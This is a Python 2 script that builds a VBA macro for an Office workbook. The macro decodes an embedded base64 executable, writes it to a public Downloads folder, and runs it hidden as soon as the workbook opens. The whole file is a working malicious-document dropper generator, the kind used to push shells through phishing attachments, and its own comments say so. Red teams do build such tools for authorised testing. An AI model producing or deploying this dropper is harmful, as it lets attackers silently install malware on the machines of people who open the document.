#!/bin/python

import os, sys
import argparse
import re
import zlib, base64

#command line args
parser = argparse.ArgumentParser(description='Generates the macro payload to drop an encoded executable to disk.')
parser.add_argument('--exe', dest='exe_name', action='store', default='test.exe')
parser.add_argument('--out', dest='vb_name', action='store', default='test.vb')
parser.add_argument('--dest', dest='dest', action='store', default='C:\\Users\\Public\\Downloads\\test.exe')

args=parser.parse_args()
if '\\' not in args.dest:
	print "[!] Error: The Destination, " + args.dest + " is not escaped properly. Please escape all backslashes and try again."
	print "[!]    ex: C:\\temp.exe"
	sys.exit(1)

#OPEN THE FILE
if os.path.isfile(args.exe_name): todo = open(args.exe_name, 'rb').read()
else: sys.exit(0)

def formStr(varstr, instr):
 holder = []
 str2 = ''
 str1 = '\r\n' + varstr + ' = "' + instr[:1007] + '"' 
 for i in xrange(1007, len(instr), 1001):
 	holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+1001])
 	str2 = '"\r\n'.join(holder)
 
 str2 = str2 + "\""
 str1 = str1 + "\r\n"+str2
 return str1

#ENCODE THE FILE
print "[+] Encoding %d bytes" % (len(todo), )
b64 = todo.encode("base64")	
print "[+] Encoded data is %d bytes" % (len(b64), )
b64 = b64.replace("\n","")

############
### added check for procedure too large error (65535b) + the variable space.  
### We are going to split in chunks of 50000 to ensure we are under the cap
### VBA/Macro has a limit of 65534 lines as well.  Is this per macro or per procedure? 
### so 1001 * 65490ish lines, should give us theoretical max of something around 65M bytes for now. 
### Should more than enough for any shell anyone is trying to push ;-)
############

x=50000

strs = [b64[i:i+x] for i in range(0, len(b64), x)]

for j in range(len(strs)):
	##### Avoids "Procedure too large error with large executables" #####
	strs[j] = formStr("var"+str(j),strs[j])

top = "Option Explicit\r\n\r\nConst TypeBinary = 1\r\nConst ForReading = 1, ForWriting = 2, ForAppending = 8\r\n"

next = "Private Function decodeBase64(base64)\r\n\tDim DM, EL\r\n\tSet DM = CreateObject(\"Microsoft.XMLDOM\")\r\n\t' Create temporary node with Base64 data type\r\n\tSet EL = DM.createElement(\"tmp\")\r\n\tEL.DataType = \"bin.base64\"\r\n\t' Set encoded String, get bytes\r\n\tEL.Text = base64\r\n\tdecodeBase64 = EL.NodeTypedValue\r\nEnd Function\r\n"

then1 = "Private Sub writeBytes(file, bytes)\r\n\tDim binaryStream\r\n\tSet binaryStream = CreateObject(\"ADODB.Stream\")\r\n\tbinaryStream.Type = TypeBinary\r\n\t'Open the stream and write binary data\r\n\tbinaryStream.Open\r\n\tbinaryStream.Write bytes\r\n\t'Save binary data to disk\r\n\tbinaryStream.SaveToFile file, ForWriting\r\nEnd Sub\r\n"

sub_proc=""

for i in range(len(strs)):
	sub_proc = sub_proc + "Private Function var"+str(i)+" As String\r\n"
	sub_proc = sub_proc + ""+strs[i]
	sub_proc = sub_proc + "\r\nEnd Function\r\n"

sub_open = "Private Sub Workbook_Open()\r\n"
sub_open = sub_open + "\tDim out1 As String\r\n"
for l in range (len(strs) ):
	sub_open = sub_open + "\tDim chunk"+str(l)+" As String\r\n"
	sub_open = sub_open + "\tchunk"+str(l)+" = var"+str(l)+"()\r\n"
	sub_open = sub_open + "\tout1 = out1 + chunk"+str(l)+"\r\n"

sub_open = sub_open + "\r\n\r\n\tDim decode\r\n\tdecode = decodeBase64(out1)\r\n\tDim outFile\r\n\toutFile = \""+args.dest+"\"\r\n\tCall writeBytes(outFile, decode)\r\n\r\n\tDim retVal\r\n\tretVal = Shell(outFile, 0)\r\nEnd Sub"

vb_file = top + next + then1 + sub_proc+ sub_open

print "[+] Writing to "+args.vb_name
f = open(args.vb_name, "w")
f.write(vb_file)
f.close()

